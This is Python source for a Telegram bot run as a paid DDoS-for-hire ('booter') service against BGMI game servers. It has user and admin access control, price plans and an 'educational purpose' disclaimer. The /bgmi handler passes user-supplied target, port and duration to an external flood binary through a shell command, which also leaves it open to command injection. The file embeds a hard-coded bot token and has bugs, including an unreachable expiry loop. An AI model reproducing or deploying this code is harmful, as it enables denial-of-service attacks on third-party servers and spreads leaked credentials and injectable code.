import telebot
import subprocess
from datetime import datetime, timedelta
import time
import os
from keep_alive import keep_alive

keep_alive()
bot = telebot.TeleBot('7345507165:AAErAcMHA6iT02v6QedQQC-fDcWEXkjKxYw')
USER_FILE = "users.txt"
ADMIN_FILE = "admins.txt"
LOG_FILE = "log.txt"

def read_users():
    user_ids = []
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(', ')
                if len(parts) == 2:
                    user_id, expiration_date_str = parts
                    try:
                        expiration_date = datetime.strptime(expiration_date_str, '%Y-%m-%d')
                        user_ids.append(user_id)
                    except ValueError:
                        pass
    except FileNotFoundError:
        pass
    return user_ids

def read_admins():
    try:
        with open(ADMIN_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()
allowed_admin_ids = read_admins()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in allowed_admin_ids:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            try:
                days = int(command[2])
                expiration_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
                user_entry = f"{user_to_add}, {expiration_date}"
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, 'a') as file:
                        file.write(f"{user_entry}\n")
                    response = f"User {user_to_add} Added Successfully with an expiration of {days} days 👍."
                else:
                    response = "User already exists ."
            except ValueError:
                response = "Invalid number of days specified 🤦."
        else:
            response = "Please specify a user ID to add 😒.\n✅ Usage: /add <userid> <days>"
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."

    bot.reply_to(message, response)

@bot.message_handler(commands=['admin_add'])
def add_admin(message):
    new_admin_id = str(message.chat.id)
    if new_admin_id in allowed_admin_ids:
        command = message.text.split()
        if len(command) > 1:
            admin_to_add = command[1]
            if admin_to_add not in allowed_admin_ids:
                allowed_admin_ids.append(admin_to_add)
                with open(ADMIN_FILE, "a") as file:
                    file.write(f"{admin_to_add}\n")
                response = f"Admin {admin_to_add} Added Successfully 👍."
            else:
                response = "Admin already exists 🤦."
        else:
            response = "Please specify a Admin's user ID to add 😒.\n✅ Usage: /admin_add <userid>"
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in allowed_admin_ids:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. \n✅ Usage: /remove <userid>'''
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."

    bot.reply_to(message, response)

@bot.message_handler(commands=['admin_remove'])
def remove_admin(message):
    admin_id = str(message.chat.id)
    if admin_id in allowed_admin_ids:
        command = message.text.split()
        if len(command) > 1:
            admin_to_remove = command[1]
            if admin_to_remove in allowed_admin_ids:
                allowed_admin_ids.remove(admin_to_remove)
                with open(ADMIN_FILE, "w") as file:
                    for admin_id in allowed_admin_ids:
                        file.write(f"{admin_id}\n")
                response = f"User {admin_to_remove} removed successfully 👍."
            else:
                response = f"User {admin_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. \n✅ Usage: /remove <userid>'''
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in allowed_admin_ids:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in allowed_admin_ids:
        response = "Authorized Users :\n"
        for user_id in allowed_user_ids:
            try:
                user_info = bot.get_chat(int(user_id))
                username = user_info.username
                response += f"- @{username} (ID: {user_id})\n"
            except Exception as e:
                response += f"- User ID: {user_id}\n"
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."
    bot.reply_to(message, response)

@bot.message_handler(commands=['alladmins'])
def show_all_admins(message):
    user_id = str(message.chat.id)
    if user_id in allowed_admin_ids:
        response = "Authorized Admins :\n"
        for user_id in allowed_admin_ids:
            try:
                admin_info = bot.get_chat(int(user_id))
                username = admin_info.username
                response += f"- @{username} (ID: {user_id})\n"
            except Exception as e:
                response += f"- User ID: {admin_id}\n"
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_admin_ids:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
    bot.reply_to(message, response)

bgmi_cooldown = {}

COOLDOWN_TIME =0

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in allowed_admin_ids:
            if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 241:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {time} Seconds\n\n👛Dm to Buy : @MR_BLACKEY"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = " You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''😍Welcome to MR_BLACKEY_HACKS BGMI D-DoS Bot\n\n🤖 Available commands:\n💥 /bgmi : Method For Bgmi Servers. \n💥 /rules : Please Check Before Use !!.\n💥 /mylogs : To Check Your Recents Attacks.\n💥 /plan : Checkout Our Botnet Rates.\n\n🤖 To See Admin Commands:\n💥 /admincmd : Shows All Admin Commands.\n\n'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to our MR_BLACKEY_HACKS, BGMI D-DoS BOT, {user_name}!\nFeel Free to Explore the bot.\n🤖Try To Run This Command : /help \n'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['ping'])
def check_ping(message):
    start_time = time.time()
    bot.reply_to(message, "Pong!")
    end_time = time.time()
    ping = (end_time - start_time) * 1000
    bot.send_message(message.chat.id, f"Bot Ping : {ping:.2f} ms")

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''Please Follow These Rules ❗:\n\n1. We are not responsible for any D-DoS attacks, send by our bot. This bot is only for educational purpose and it's source code freely available in github.!!\n2. D-DoS Attacks will expose your IP Address to the Attacking server. so do it with your own risk. \n3. The power of D-DoS is enough to down any game's server. So kindly don't use it to down a website server..!!\n\nFor more : @MR_BLACKEY_HACKS'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''Offer :\n1) 3 Days - ₹120/Acc,\n2) 7 Days - ₹500/Acc,\n3) 15 Days - ₹1000/Acc,\n4) 30 Days - ₹1800/Acc,\n5) 60 Days (Full Season) - ₹3500/Acc\n\n{user_name} can Claim this offer,\nDm to make purchase @MR_BLACKEY\n\n\nNote : All Currencies Accepted via Binance.'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_admin(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:\n\n💥 /add <userId> : Add a User.\n💥 /remove <userid> Remove a User.\n💥 /allusers : Authorised Users Lists.\n💥 /logs : All Users Logs.\n💥 /broadcast : Broadcast a Message.\n💥 /clearlogs : Clear The Logs File.\n'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in allowed_admin_ids:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact @MR_BLACKEY."

    bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
while True:
    now = datetime.now()
    allowed_user_ids = [
        user for user in allowed_user_ids
        if datetime.strptime(user.split(',')[1], '%Y-%m-%d') >= now
    ]
    with open(USER_FILE, 'w') as file:
        for user in allowed_user_ids:
            file.write(f"{user}\n")
